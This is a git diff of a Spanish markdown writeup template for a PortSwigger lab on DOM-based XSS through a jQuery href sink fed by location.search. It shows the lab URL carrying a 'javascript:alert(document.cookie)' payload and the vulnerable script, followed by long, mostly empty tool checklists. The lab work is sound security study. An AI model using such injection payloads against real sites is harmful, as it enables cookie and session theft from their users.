@@ -1,18 +1,16 @@
 # 💀 WRITEUP EXTENSO
 
-
-
 <details>
 
 <summary>👁️ RECONOCIMIENTO PASIVO ✔️</summary>
 
-## AUDITORIA DE: ((Laboratorio: DOM XSS en el receptor de atributos de anclaje jQuery hrefusando location.search))
+### AUDITORIA DE: ((Laboratorio: DOM XSS en el receptor de atributos de anclaje jQuery hrefusando location.search))
 
 ***
 
 ***
 
-### RECONOCIMIENTO PASIVO
+#### RECONOCIMIENTO PASIVO
 
 *   [x] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
 
@@ -22,21 +20,22 @@
 
     https://0aac007e04fc89f280813502004b0007.web-security-academy.net/feedback? 
     returnPath=javascript:alert(document.cookie)
-    
-    
+
+
     ---------
-    
-    
-    
+
+
+
     SCRIPT :
-    
-    
+
+
     $(function() {
     $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
     });
                     
     ```
-     ![DOM-XSSenFuntiondeHREF-PATH](https://github.com/MammaniNelsonD/P4IM0N_H4CKING/assets/114308492/31cf373e-6510-41ee-8d8f-db057b812489)
+
+    ![DOM-XSSenFuntiondeHREF-PATH](https://github.com/MammaniNelsonD/P4IM0N\_H4CKING/assets/114308492/31cf373e-6510-41ee-8d8f-db057b812489)
 
     * CONCLUSION: LUEGO DE INCORPORAR EN LA QUERY DE LA URL NEUSTRO PAYLOAD (javascript:alert(document.cookie)) SIMPLEMENTE CONSEGIMOS LA EJECUCION DE ESTA PATH QUE SE AGREGA POR EL SCRIPT EN EL DOM LOGARANDO LA INYECION XSS Y EL ALERT.
 *   [ ] BROWSER👈 --------------------------------->[https://www.paimon.com.ar/](https://www.google.com/)
@@ -60,14 +59,14 @@
     ```
 
     * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
+*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
+*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -88,7 +87,7 @@
     ```
 
     * CONCLUSION:
-*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan)
+*   [ ] SHODAN👈 --------------------------------->[https://www.shodan.io/ ](https://www.shodan.io/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/shodan.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -116,14 +115,14 @@
     ```
 
     * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
+*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking)
+*   [ ] GOOGLE DORKS👈 --------------------------------->[https://www.google.com/ ](https://www.google.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/google-dorking.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -207,7 +206,7 @@
     ```
 
     * CONCLUSION:
-*   [ ] P4INformesmentales👈 --------------------------------->[https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py)
+*   [ ] P4INformesmentales👈 --------------------------------->[https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py](../../../curso-hacking-con-python/tool-para-informes-de-mapas-mentales-p4informesmentales.py.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -232,78 +231,74 @@
 ***
 
 ***
-
-
 
 </details>
 
 🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫🟫
 
-
-
 <details>
 
 <summary>🔬 ANALISIS FORENSE ❌</summary>
 
-### ANALISIS FORENSE
+#### ANALISIS FORENSE
 
-*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics)
+*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics)
+*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic)
+*   [ ] AUTOPSY👈 [https://tools.kali.org/forensics/autopsy](https://tools.kali.org/forensics/autopsy)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/autopsy-digital-forensics.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic)
+*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic)
+*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic)
+*   [ ] VOLATILITY👈 [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/volatility-memory-forensic.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic)
+*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic)
+*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic.md)
+
+    ```python
+    # Espacio para fragmento de código Python -->
+    ```
+
+    * CONCLUSION:
+*   [ ] FTK👈 [https://www.accessdata.com/products-services/forensic-toolkit-ftk](https://www.accessdata.com/products-services/forensic-toolkit-ftk)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ftk-digital-forensic.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -352,42 +347,42 @@
     ```
 
     * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
+*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
+*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
+*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
+*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
+*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
+*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -438,13 +433,11 @@
 
 🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
 
-
-
 <details>
 
 <summary>👊 RECONOCIMIENTO ACTIVO ❌</summary>
 
-### RECONOCIMIENTO ACTIVO
+#### RECONOCIMIENTO ACTIVO
 
 *   [ ] PING👈 --------------------------------->[https://www.kali.org/tools/fping/](https://www.kali.org/tools/fping/)
 
@@ -453,21 +446,21 @@
     ```
 
     * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
+*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
+*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap)
+*   [ ] NMAP👈 --------------------------------->[https://nmap.org/ ](https://nmap.org/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/nmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -495,35 +488,35 @@
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit)
+*   [ ] METASPLOIT👈 --------------------------------->[https://www.metasploit.com/ ](https://www.metasploit.com/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/metasploit.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite)
+*   [ ] BURP SUITE👈 --------------------------------->[https://portswigger.net/web-security ](https://portswigger.net/web-security)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/burpsuite.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -537,21 +530,14 @@
     ```
 
     * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
+*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark)
-
-    ```python
-    # Espacio para fragmento de código Python -->
-    ```
-
-    * CONCLUSION:
-*   [ ] DIRBUSTER👈 --------------------------------->[https://github.com/KajanM/DirBuster](https://github.com/KajanM/DirBuster)
+*   [ ] WIRESHARK👈 --------------------------------->[https://github.com/wireshark/wireshark ](https://github.com/wireshark/wireshark)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/wireshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -565,14 +551,21 @@
     ```
 
     * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
+*   [ ] DIRBUSTER👈 --------------------------------->[https://github.com/KajanM/DirBuster](https://github.com/KajanM/DirBuster)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap)
+*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)
+
+    ```python
+    # Espacio para fragmento de código Python -->
+    ```
+
+    * CONCLUSION:
+*   [ ] SQLMAP👈 --------------------------------->[https://github.com/sqlmapproject/sqlmap ](https://github.com/sqlmapproject/sqlmap)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/sqlmap.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -607,14 +600,14 @@
     ```
 
     * CONCLUSION:
-*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf)
+*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf)
+*   [ ] FFUF👈 --------------------------------->[https://www.kali.org/tools/ffuf/ ](https://www.kali.org/tools/ffuf/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ffuf.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -670,21 +663,21 @@
     ```
 
     * CONCLUSION:
-*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell)
+*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell)
+*   [ ] SSH👈 --------------------------------->[https://www.kali.org/tools/openssh/ ](https://www.kali.org/tools/openssh/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/ssh-secure-shell.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones)
+*   [ ] NETCAT👈 --------------------------------->[https://www.kali.org/tools/netcat/ ](https://www.kali.org/tools/netcat/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/netcat-conexiones.md)
 
     ```python
     # Espacio para fragmento de código Python -->
@@ -733,28 +726,28 @@
     ```
 
     * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
+*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
+*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](../../../manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark.md)
 
     ```python
     # Espacio para fragmento de código Python -->
     ```
 
     * CONCLUSION:
-*   [ ] TSHARK👈 --------------------------------->[https://www.kali.org/tools/wireshark/ ](https://www.kali.org/tools/wireshark/)--->[PDF-TOOL](https://app.gitbook.com/o/7R5fPL7tMt73q9k0N7ZG/s/2rX5FvtpEjxBEKVG60XW/\~/changes/46/manuales-de-tools-en-pdf-y-mas/tools-hacking-pdf/tshark)
